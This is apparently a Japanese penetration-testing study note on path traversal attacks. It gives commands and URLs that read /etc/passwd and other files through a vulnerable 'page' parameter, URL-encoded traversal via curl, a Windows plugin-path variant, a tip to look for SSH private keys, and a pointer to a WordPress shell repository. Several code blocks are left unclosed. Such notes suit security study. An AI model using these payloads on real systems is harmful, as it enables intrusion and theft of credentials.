
以下は、ファイルのパスを使用した攻撃手法に関する情報を整理したMarkdownファイルです。

markdown

# ファイルのパスを使用した攻撃手法

## `/etc/passwd`ファイルの表示

### 絶対パスを使用して表示
```bash
cat /etc/passwd
```
### 相対パスを使用して表示
```bash
cat ../../../etc/passwd
```
例: 現在のディレクトリが/var/log/の場合、/etc/passwdを表示するには次のようにします：
```bash
cat ../../etc/passwd
```
### Webアプリケーションでの悪用
パラメータを利用した悪用例
Webアプリケーションでパラメータが悪用される可能性があります。以下はその例です：

http
```bash
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```
この例では、pageパラメータを利用してサーバーの/etc/passwdファイルにアクセスしています。
#### id_rsaやid_ecdsaファイルの確認
特定のファイルが存在するか確認するために、id_rsaやid_ecdsaなどのファイルをチェックすることが重要です。
出力が正しくフォーマットされない場合
出力が正しく表示されない場合は、curlを使用して内容を確認することができます：

```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
Windows環境での悪用
Windows環境では、ドライブ指定が不要なため、以下のように悪用できます：

http

http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
URLエンコード
パスが表示されない場合
パスが直接表示されない場合は、URLエンコードを使用してパスをエンコードします：

```bash

curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
WordPressの脆弱性
簡単なエクスプロイト
WordPressの脆弱性を利用する簡単なエクスプロイト例です：

GitHubリポジトリ: leonjza/wordpress-shell
